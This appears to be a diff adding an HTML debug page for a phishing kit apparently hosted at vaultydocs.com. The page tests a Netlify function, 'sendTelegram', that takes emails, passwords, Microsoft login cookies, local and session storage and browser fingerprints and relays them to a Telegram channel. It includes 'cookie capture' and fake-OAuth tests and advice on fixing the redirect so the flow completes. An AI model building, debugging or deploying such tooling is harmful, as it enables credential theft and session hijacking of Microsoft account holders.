@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Frontend Telegram Debug Tool</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #00ff00; }
+        .container { max-width: 800px; margin: 0 auto; }
+        .section { margin: 20px 0; padding: 15px; border: 1px solid #333; border-radius: 5px; }
+        .error { color: #ff4444; }
+        .success { color: #44ff44; }
+        .warning { color: #ffaa44; }
+        .info { color: #4444ff; }
+        button { padding: 10px 20px; margin: 5px; background: #333; color: #fff; border: 1px solid #555; cursor: pointer; }
+        button:hover { background: #555; }
+        input, textarea { width: 100%; padding: 10px; margin: 5px 0; background: #222; color: #fff; border: 1px solid #555; }
+        pre { background: #000; padding: 10px; border-radius: 5px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔍 Frontend Telegram Integration Debug Tool</h1>
+        
+        <div class="section">
+            <h2>1. Environment Check</h2>
+            <button onclick="checkEnvironment()">Check Environment</button>
+            <div id="envResult"></div>
+        </div>
+
+        <div class="section">
+            <h2>2. Function Accessibility Test</h2>
+            <button onclick="testFunctionAccess()">Test /.netlify/functions/sendTelegram</button>
+            <div id="funcResult"></div>
+        </div>
+
+        <div class="section">
+            <h2>3. OAuth Flow Simulation</h2>
+            <button onclick="simulateOAuthFlow()">Simulate OAuth Flow</button>
+            <div id="oauthResult"></div>
+        </div>
+
+        <div class="section">
+            <h2>4. Direct Telegram Test</h2>
+            <input type="email" id="testEmail" placeholder="test@example.com" value="test@example.com">
+            <input type="text" id="testPassword" placeholder="test password" value="TestPassword123">
+            <button onclick="testDirectTelegram()">Send Test Data to Telegram</button>
+            <div id="telegramResult"></div>
+        </div>
+
+        <div class="section">
+            <h2>5. Cookie Capture Test</h2>
+            <button onclick="testCookieCapture()">Test Cookie Capture</button>
+            <div id="cookieResult"></div>
+        </div>
+
+        <div class="section">
+            <h2>6. OAuth URL Analysis</h2>
+            <button onclick="analyzeOAuthURL()">Analyze OAuth Configuration</button>
+            <div id="oauthUrlResult"></div>
+        </div>
+
+        <div class="section">
+            <h2>7. Real-time Console Monitor</h2>
+            <button onclick="startConsoleMonitor()">Start Monitoring Console</button>
+            <button onclick="stopConsoleMonitor()">Stop Monitoring</button>
+            <div id="consoleMonitor"></div>
+        </div>
+
+        <div class="section">
+            <h2>Diagnosis Results</h2>
+            <div id="diagnosis"></div>
+        </div>
+    </div>
+
+    <script>
+        let consoleMonitorActive = false;
+        let originalConsoleLog = console.log;
+        let originalConsoleError = console.error;
+
+        function log(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const className = type;
+            return `<div class="${className}">[${timestamp}] ${message}</div>`;
+        }
+
+        function checkEnvironment() {
+            const result = document.getElementById('envResult');
+            result.innerHTML = log('🔍 Checking environment...', 'info');
+            
+            let issues = [];
+            let checks = [];
+
+            // Check current URL
+            const currentURL = window.location.href;
+            checks.push(`Current URL: ${currentURL}`);
+
+            // Check if this is the deployed site
+            if (currentURL.includes('localhost') || currentURL.includes('127.0.0.1')) {
+                issues.push('⚠️ Running on localhost - environment variables might differ from deployment');
+            }
+
+            // Check OAuth redirect URL compatibility
+            const expectedRedirect = 'https://vaultydocs.com/oauth-callback';
+            if (!currentURL.includes('vaultydocs.com')) {
+                issues.push(`❌ Domain mismatch: Code expects ${expectedRedirect} but running on ${new URL(currentURL).hostname}`);
+            }
+
+            // Check for OAuth callback parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const hasCode = urlParams.get('code');
+            const hasState = urlParams.get('state');
+            const hasError = urlParams.get('error');
+
+            if (hasCode) checks.push('✅ OAuth code parameter found');
+            if (hasState) checks.push('✅ OAuth state parameter found');
+            if (hasError) issues.push(`❌ OAuth error: ${hasError}`);
+
+            result.innerHTML += checks.map(c => log(c, 'success')).join('');
+            result.innerHTML += issues.map(i => log(i, 'error')).join('');
+        }
+
+        async function testFunctionAccess() {
+            const result = document.getElementById('funcResult');
+            result.innerHTML = log('🔍 Testing function accessibility...', 'info');
+
+            try {
+                const response = await fetch('/.netlify/functions/sendTelegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ test: true })
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    result.innerHTML += log('✅ Function is accessible', 'success');
+                    result.innerHTML += log(`Response: ${JSON.stringify(data)}`, 'info');
+                } else {
+                    const errorText = await response.text();
+                    result.innerHTML += log(`❌ Function returned error: ${response.status}`, 'error');
+                    result.innerHTML += log(`Error details: ${errorText}`, 'error');
+                }
+            } catch (error) {
+                result.innerHTML += log(`❌ Function not accessible: ${error.message}`, 'error');
+                result.innerHTML += log('💡 This might indicate the function is not deployed or has a different name', 'warning');
+            }
+        }
+
+        async function simulateOAuthFlow() {
+            const result = document.getElementById('oauthResult');
+            result.innerHTML = log('🔍 Simulating OAuth flow...', 'info');
+
+            // Check if we have OAuth parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code');
+            const state = urlParams.get('state');
+
+            if (!code) {
+                result.innerHTML += log('❌ No OAuth code found in URL', 'error');
+                result.innerHTML += log('💡 This means you haven\'t completed the OAuth flow yet', 'warning');
+                result.innerHTML += log('💡 Try logging in first, then run this test', 'warning');
+                return;
+            }
+
+            result.innerHTML += log('✅ OAuth code found, simulating callback...', 'success');
+
+            // Simulate the OAuth callback process
+            try {
+                // Create test session data (similar to what OAuth would create)
+                const testSessionData = {
+                    email: 'debug@test.com',
+                    name: 'Debug User',
+                    provider: 'Microsoft',
+                    sessionId: Math.random().toString(36).substring(2, 15),
+                    timestamp: new Date().toISOString(),
+                    password: 'OAuth Login - No Password',
+                    fileName: 'Debug Test Login',
+                    formattedCookies: [
+                        {
+                            name: 'debug_cookie',
+                            value: 'debug_value',
+                            domain: '.login.microsoftonline.com',
+                            path: '/',
+                            secure: true
+                        }
+                    ]
+                };
+
+                result.innerHTML += log('🔄 Testing Telegram send with simulated data...', 'info');
+
+                const response = await fetch('/.netlify/functions/sendTelegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: testSessionData.email,
+                        password: testSessionData.password,
+                        provider: testSessionData.provider,
+                        formattedCookies: testSessionData.formattedCookies,
+                        userAgent: navigator.userAgent,
+                        browserFingerprint: {
+                            cookies: testSessionData.formattedCookies,
+                            localStorage: JSON.stringify({}),
+                            sessionStorage: JSON.stringify({}),
+                        }
+                    })
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    result.innerHTML += log('✅ OAuth simulation successful!', 'success');
+                    result.innerHTML += log(`Response: ${JSON.stringify(data)}`, 'info');
+                    if (data.success) {
+                        result.innerHTML += log('🎉 Data should have been sent to Telegram!', 'success');
+                    }
+                } else {
+                    const errorText = await response.text();
+                    result.innerHTML += log(`❌ OAuth simulation failed: ${response.status}`, 'error');
+                    result.innerHTML += log(`Error: ${errorText}`, 'error');
+                }
+
+            } catch (error) {
+                result.innerHTML += log(`❌ OAuth simulation error: ${error.message}`, 'error');
+            }
+        }
+
+        async function testDirectTelegram() {
+            const result = document.getElementById('telegramResult');
+            const email = document.getElementById('testEmail').value;
+            const password = document.getElementById('testPassword').value;
+
+            result.innerHTML = log('🔍 Testing direct Telegram send...', 'info');
+
+            try {
+                const testData = {
+                    email: email,
+                    password: password,
+                    provider: 'Microsoft',
+                    fileName: 'Direct Test',
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    formattedCookies: [
+                        {
+                            name: 'test_cookie',
+                            value: 'test_value_' + Date.now(),
+                            domain: '.login.microsoftonline.com',
+                            path: '/',
+                            secure: true
+                        }
+                    ],
+                    browserFingerprint: {
+                        cookies: [],
+                        localStorage: JSON.stringify({ debug: 'test' }),
+                        sessionStorage: JSON.stringify({ debug: 'test' }),
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        timestamp: new Date().toISOString()
+                    }
+                };
+
+                result.innerHTML += log('🔄 Sending test data...', 'info');
+
+                const response = await fetch('/.netlify/functions/sendTelegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(testData)
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    result.innerHTML += log('✅ Direct test successful!', 'success');
+                    result.innerHTML += log(`Response: ${JSON.stringify(data, null, 2)}`, 'info');
+                    
+                    if (data.success) {
+                        result.innerHTML += log('🎉 Check your Telegram for the test message!', 'success');
+                    } else {
+                        result.innerHTML += log('⚠️ Function executed but reported failure', 'warning');
+                    }
+                } else {
+                    const errorText = await response.text();
+                    result.innerHTML += log(`❌ Direct test failed: ${response.status}`, 'error');
+                    result.innerHTML += log(`Error: ${errorText}`, 'error');
+                }
+
+            } catch (error) {
+                result.innerHTML += log(`❌ Direct test error: ${error.message}`, 'error');
+            }
+        }
+
+        function testCookieCapture() {
+            const result = document.getElementById('cookieResult');
+            result.innerHTML = log('🔍 Testing cookie capture...', 'info');
+
+            const cookies = document.cookie;
+            result.innerHTML += log(`Current cookies: ${cookies || 'None'}`, 'info');
+
+            // Test cookie setting
+            document.cookie = 'debug_test=value123; path=/';
+            const newCookies = document.cookie;
+            
+            if (newCookies.includes('debug_test')) {
+                result.innerHTML += log('✅ Can set cookies', 'success');
+            } else {
+                result.innerHTML += log('❌ Cannot set cookies', 'error');
+            }
+
+            // Test localStorage
+            try {
+                localStorage.setItem('debug_test', 'test');
+                const stored = localStorage.getItem('debug_test');
+                if (stored === 'test') {
+                    result.innerHTML += log('✅ localStorage works', 'success');
+                } else {
+                    result.innerHTML += log('❌ localStorage not working', 'error');
+                }
+            } catch (e) {
+                result.innerHTML += log(`❌ localStorage error: ${e.message}`, 'error');
+            }
+        }
+
+        function analyzeOAuthURL() {
+            const result = document.getElementById('oauthUrlResult');
+            result.innerHTML = log('🔍 Analyzing OAuth configuration...', 'info');
+
+            const currentURL = new URL(window.location.href);
+            const expectedRedirect = 'https://vaultydocs.com/oauth-callback';
+            
+            result.innerHTML += log(`Current domain: ${currentURL.hostname}`, 'info');
+            result.innerHTML += log(`Expected redirect: ${expectedRedirect}`, 'info');
+
+            if (currentURL.hostname === 'vaultydocs.com') {
+                result.innerHTML += log('✅ Domain matches OAuth configuration', 'success');
+            } else {
+                result.innerHTML += log('❌ Domain mismatch detected!', 'error');
+                result.innerHTML += log('💡 This is likely why OAuth flow fails', 'warning');
+                result.innerHTML += log('💡 Update REDIRECT_URI in RealOAuthRedirect.tsx', 'warning');
+            }
+
+            // Check OAuth state
+            const storedState = localStorage.getItem('oauth_state');
+            if (storedState) {
+                result.innerHTML += log(`✅ OAuth state stored: ${storedState}`, 'success');
+            } else {
+                result.innerHTML += log('⚠️ No OAuth state found', 'warning');
+            }
+        }
+
+        function startConsoleMonitor() {
+            consoleMonitorActive = true;
+            const monitor = document.getElementById('consoleMonitor');
+            monitor.innerHTML = log('📡 Console monitoring started...', 'info');
+
+            console.log = function(...args) {
+                if (consoleMonitorActive) {
+                    monitor.innerHTML += log('LOG: ' + args.join(' '), 'info');
+                }
+                originalConsoleLog.apply(console, args);
+            };
+
+            console.error = function(...args) {
+                if (consoleMonitorActive) {
+                    monitor.innerHTML += log('ERROR: ' + args.join(' '), 'error');
+                }
+                originalConsoleError.apply(console, args);
+            };
+        }
+
+        function stopConsoleMonitor() {
+            consoleMonitorActive = false;
+            console.log = originalConsoleLog;
+            console.error = originalConsoleError;
+            document.getElementById('consoleMonitor').innerHTML += log('📡 Console monitoring stopped', 'warning');
+        }
+
+        // Auto-run environment check on load
+        window.addEventListener('load', () => {
+            checkEnvironment();
+            
+            // Show diagnosis
+            const diagnosis = document.getElementById('diagnosis');
+            diagnosis.innerHTML = `
+                <h3>🎯 Most Likely Issues:</h3>
+                <div class="warning">1. Domain mismatch between code and deployment</div>
+                <div class="warning">2. Environment variables not set in Netlify</div>
+                <div class="warning">3. OAuth flow not completing properly</div>
+                <div class="warning">4. Function not accessible on deployed site</div>
+                
+                <h3>🔧 Action Plan:</h3>
+                <div class="info">1. Run all tests above</div>
+                <div class="info">2. Check browser console during login</div>
+                <div class="info">3. Verify Netlify environment variables</div>
+                <div class="info">4. Update OAuth redirect URL if needed</div>
+            `;
+        });
+    </script>
+</body>
+</html>
